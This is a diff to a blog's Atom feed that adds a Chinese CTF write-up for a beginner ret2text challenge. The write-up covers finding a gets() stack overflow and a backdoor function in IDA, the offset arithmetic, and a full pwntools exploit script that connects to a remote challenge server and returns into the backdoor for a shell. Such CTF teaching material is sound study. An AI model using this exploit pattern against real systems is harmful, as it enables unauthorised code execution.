@@ -10,7 +10,25 @@
   <rights>All rights reserved 2026, SAKURA</rights>
   <subtitle>记录 · 思考 · 分享</subtitle>
   <title>我的博客</title>
-  <updated>2026-10-08T12:12:57.000Z</updated>
+  <updated>2026-10-23T16:43:20.000Z</updated>
+  <entry>
+    <author>
+      <name>SAKURA</name>
+    </author>
+    <category term="技术笔记" scheme="https://jianglingge.github.io/categories/%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/"/>
+    <category term="Pwn" scheme="https://jianglingge.github.io/tags/Pwn/"/>
+    <category term="栈溢出" scheme="https://jianglingge.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
+    <category term="CTF" scheme="https://jianglingge.github.io/tags/CTF/"/>
+    <content>
+      <![CDATA[<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>将题目附件拖入IDA打开</p><span id="more"></span><p><img src="/img/simple-ret2text/01.png"></p><p>左侧可以看到有backdoor后门函数</p><p><img src="/img/simple-ret2text/02.png"></p><p><img src="/img/simple-ret2text/03.png"></p><p>再看从程序开始执行到vuln函数，有一个gets()函数，这是一个栈溢出漏洞，因为没有对输入做出长度检查，我们可以去进行栈溢出</p><p>双击s可以看到s这里的栈布局</p><p><img src="/img/simple-ret2text/04.png"></p><p>也可以在c代码页面中直接看，s这个参数到栈底rbp的距离是0x20</p><p><img src="/img/simple-ret2text/05.png"></p><p>但是在这个溢出点前还有一个taffy()函数，点进去看一下是干什么用的</p><p><img src="/img/simple-ret2text/06.png"></p><p>这里可以看到，这是对输入的字符进行一个比较，但是这是没有什么作用的，所以这里随便填，就能到下面的溢出点了</p><p>去查看backdoor()的地址，0x40123B</p><p><img src="/img/simple-ret2text/07.png"></p><p>然后就可以去构造payload了</p><p>先发送0x20的垃圾数据填充从s到栈底的空间，再发送一个0x8的数据覆盖rbp，ret地址在rbp的下一位，所以在填充完从s到覆盖rbp的位置后就可以直接传backdoor()的函数</p><p>栈空间布局：</p><p><img src="/img/simple-ret2text/08.jpeg" alt="画板"></p><h2 id="解题脚本（exp）"><a href="#解题脚本（exp）" class="headerlink" title="解题脚本（exp）"></a>解题脚本（exp）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;175.24.227.50&#x27;</span>,<span class="number">35264</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x40123B</span></span><br><span class="line">ret_gadget = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x20</span> + <span class="number">8</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p64(ret_gadget) + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;大唐王朝中是谁开疆拓土？&#x27;</span>.encode(),<span class="string">b&#x27;taffy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;请开始你的表演：&#x27;</span>.encode(), payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]>
+    </content>
+    <id>https://jianglingge.github.io/2026/10/24/simple-ret2text/</id>
+    <link href="https://jianglingge.github.io/2026/10/24/simple-ret2text/"/>
+    <published>2026-10-23T16:43:20.000Z</published>
+    <summary>一道 ret2text 入门题：用 IDA 定位 backdoor 后门函数与 gets 栈溢出点，以 0x20 填充加 0x8 覆盖 rbp，再接 ret gadget 与后门地址拿下 shell。</summary>
+    <title>来一个简单ret2text</title>
+    <updated>2026-10-23T16:43:20.000Z</updated>
+  </entry>
   <entry>
     <author>
       <name>SAKURA</name>
